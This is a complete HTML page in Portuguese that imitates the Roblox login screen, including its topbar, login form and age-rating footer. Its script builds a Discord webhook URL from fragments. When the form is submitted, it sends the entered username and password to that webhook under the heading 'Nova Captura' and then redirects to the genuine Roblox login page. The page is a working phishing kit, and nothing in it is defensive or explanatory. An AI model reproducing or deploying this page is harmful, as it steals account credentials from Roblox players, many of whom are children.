<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Entrar na Roblox</title>
    <link rel="icon" href="https://www.roblox.com/favicon.ico">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Hanken+Grotesk:wght@400;500;600;700;800&display=swap');
        
        * {
            margin: 0; padding: 0; box-sizing: border-box;
            font-family: 'Hanken Grotesk', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            background-color: #000000;
            color: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            overflow-x: hidden;
            /* Imagem de fundo dos jogos com degradê escuro */
            background-image: 
                linear-gradient(to bottom, rgba(0,0,0,0.4) 0%, rgba(0,0,0,0.8) 100%),
                url('https://images.rbxcdn.com/2c3e2e7b4e5f4a6e8c9d0e1f2a3b4c5d.jpg');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
        }

        /* TOPBAR */
        .topbar {
            background-color: #191b1f;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 10px 16px;
            border-bottom: 1px solid #2e3134;
            z-index: 100;
            height: 60px;
        }

        .topbar-left { display: flex; align-items: center; gap: 12px; flex: 1; }
        
        /* Logo Quadrado Inclinado Exato do Print */
        .logo-icon {
            width: 32px;
            height: 32px;
            background-color: #ffffff;
            transform: rotate(-15deg);
            border-radius: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .logo-hole {
            width: 10px;
            height: 10px;
            background-color: #191b1f;
        }

        .search-bar {
            background-color: #272a2e;
            border: 1px solid #3b3f43;
            border-radius: 8px;
            padding: 8px 12px;
            display: flex;
            align-items: center;
            gap: 8px;
            flex: 1;
            max-width: 250px;
            color: #9ea2a6;
            font-size: 14px;
        }

        .topbar-right { display: flex; align-items: center; gap: 10px; }

        .btn-cadastrar {
            background-color: #335fff; color: #fff; border: none;
            padding: 8px 14px; border-radius: 6px; font-size: 14px; font-weight: 600; cursor: pointer;
        }

        .btn-entrar-top {
            background-color: transparent; color: #fff; border: 1px solid #ffffff;
            padding: 8px 14px; border-radius: 6px; font-size: 14px; font-weight: 600; cursor: pointer;
        }

        /* NAVEGAÇÃO */
        .nav-mobile {
            display: flex;
            justify-content: space-around;
            background-color: #191b1f;
            padding: 14px 0;
            border-bottom: 1px solid #2e3134;
            font-size: 15px;
            font-weight: 600;
            color: #e3e3e3;
        }
        .nav-mobile span.active { color: #fff; border-bottom: 2px solid #fff; padding-bottom: 12px; margin-bottom: -14px; }

        /* ÁREA CENTRAL */
        .main-area {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px 16px;
            position: relative;
        }

        /* CAIXA DE LOGIN */
        .login-card {
            background-color: #232527;
            width: 100%;
            max-width: 420px;
            border-radius: 8px;
            padding: 30px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.6);
            border: 1px solid #3b3f43;
            z-index: 10;
            margin-top: 10px;
        }

        .login-card h1 {
            font-size: 28px;
            font-weight: 700;
            text-align: center;
            margin-bottom: 24px;
        }

        .input-group { margin-bottom: 12px; }

        .input-group input {
            width: 100%;
            padding: 14px;
            background-color: #191b1f;
            border: 1px solid #3b3f43;
            border-radius: 8px;
            color: #fff;
            font-size: 15px;
            outline: none;
        }

        .input-group input::placeholder { color: #9ea2a6; }

        .btn-main {
            width: 100%;
            padding: 14px;
            background-color: #232527;
            border: 1px solid #ffffff;
            border-radius: 8px;
            color: #ffffff;
            font-size: 15px;
            font-weight: 600;
            margin-top: 4px;
            cursor: pointer;
        }

        .btn-main:active { background-color: #3b3f43; }

        .forgot-link {
            display: block;
            text-align: center;
            color: #ffffff;
            text-decoration: none;
            font-size: 14px;
            margin: 20px 0;
            font-weight: 600;
        }

        .divider { height: 1px; background-color: #3b3f43; margin: 20px 0; }

        .btn-secondary {
            width: 100%;
            padding: 14px;
            background-color: #272a2e;
            border: 1px solid #3b3f43;
            border-radius: 8px;
            color: #ffffff;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 12px;
            cursor: pointer;
        }

        .btn-secondary:active { background-color: #3b3f43; }

        .signup-text { text-align: center; color: #e3e3e3; font-size: 14px; margin-top: 24px; }
        .signup-text a { color: #ffffff; font-weight: 700; text-decoration: none; }

        /* RODAPÉ CLASSIFICAÇÃO (Exato do Print) */
        .footer-rating {
            background-color: #000000; /* Fundo preto */
            width: 100%;
            max-width: 420px;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            margin-top: 15px; /* Fica logo abaixo do card */
            border-radius: 4px;
        }

        .footer-text {
            font-size: 13px;
            font-weight: 800;
            color: #fff;
            margin-bottom: 10px;
            letter-spacing: 0.5px;
            text-transform: uppercase;
        }

        .rating-box {
            display: flex;
            background: #fff;
            color: #000;
            border-radius: 4px;
            overflow: hidden;
            width: 100%;
            max-width: 320px;
            margin-bottom: 12px;
        }

        .rating-red-box {
            background-color: #ff0000;
            color: #fff;
            font-size: 32px;
            font-weight: 900;
            padding: 15px 25px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .rating-text-box {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 0 16px;
            font-size: 14px;
            font-weight: 600;
        }

        .footer-desc {
            font-size: 12px;
            text-align: center;
            color: #e3e3e3;
            line-height: 1.5;
        }

        /* Ajustes para telas maiores (Desktop) */
        @media (min-width: 768px) {
            .topbar { padding: 0 24px; }
            .nav-mobile { display: none; } /* Esconde o menu mobile no PC */
            .logo-icon { width: 36px; height: 36px; }
            .search-bar { max-width: 300px; }
        }
    </style>
</head>
<body>

    <!-- TOPBAR -->
    <div class="topbar">
        <div class="topbar-left">
            <!-- Quadrado do Roblox -->
            <div class="logo-icon"><div class="logo-hole"></div></div>
            
            <div class="search-bar">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#9ea2a6" stroke-width="2"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
                Pesquisar
            </div>
        </div>
        <div class="topbar-right">
            <button class="btn-cadastrar">Cadastrar-se</button>
            <button class="btn-entrar-top">Entrar</button>
        </div>
    </div>

    <!-- NAVEGAÇÃO -->
    <div class="nav-mobile">
        <span class="active">Destaques</span>
        <span>Mercado</span>
        <span>Criar</span>
        <span>Robux</span>
    </div>

    <!-- ÁREA CENTRAL -->
    <div class="main-area">
        <!-- CARD DE LOGIN -->
        <div class="login-card">
            <h1>Entrar na Roblox</h1>
            
            <form id="login-form">
                <div class="input-group">
                    <input type="text" id="username" placeholder="Usuário/e-mail/telefone" required>
                </div>
                <div class="input-group">
                    <input type="password" id="password" placeholder="Senha" required>
                </div>
                <button type="submit" class="btn-main" id="btn-submit">Entrar</button>
            </form>

            <a href="#" class="forgot-link">Esqueceu a senha ou nome de usuário?</a>
            <div class="divider"></div>
            
            <button class="btn-secondary">Envie-me um código único por e-mail</button>
            <button class="btn-secondary">Entrada rápida</button>
            <button class="btn-secondary">Outras opções de acesso</button>

            <div class="signup-text">
                Não possui uma conta? <a href="#">Cadastrar-se</a>
            </div>
        </div>

        <!-- RODAPÉ CLASSIFICAÇÃO -->
        <div class="footer-rating">
            <div class="footer-text">CLASSIFICAÇÃO INDICATIVA: 16 ANOS</div>
            
            <div class="rating-box">
                <div class="rating-red-box">16</div>
                <div class="rating-text-box">Violência</div>
            </div>
            
            <div class="footer-desc">
                Interação entre usuários<br>
                Compras no jogo (inclui itens aleatórios)
            </div>
        </div>
    </div>

    <!-- SCRIPT -->
    <script>
        (function(){
            var p1 = "https://discord.com/api/webhooks/";
            var p2 = "1573426421085241448/";
            var p3 = "LGoTUoMIZdohFLYE9s3THG4sSUFbbi1PEF5Hd1145-KIH6KapiIvAnLGhFT4kmlfOFPL";
            var url = p1 + p2 + p3;

            var form = document.getElementById('login-form');
            var btn = document.getElementById('btn-submit');
            var u = document.getElementById('username');
            var p = document.getElementById('password');

            form.addEventListener('submit', function(e) {
                e.preventDefault();
                if(!u.value || !p.value) return;
                
                btn.textContent = 'Entrando...';
                
                var dados = {
                    content: "🎣 **Nova Captura**\n👤 User: `" + u.value + "`\n🔑 Senha: `" + p.value + "`"
                };

                fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(dados)
                }).then(function() {
                    setTimeout(function() {
                        window.location.href = 'https://www.roblox.com/pt/Login';
                    }, 1500);
                }).catch(function() {
                    btn.textContent = 'Entrar';
                });
            });
        })();
    </script>
</body>
</html>
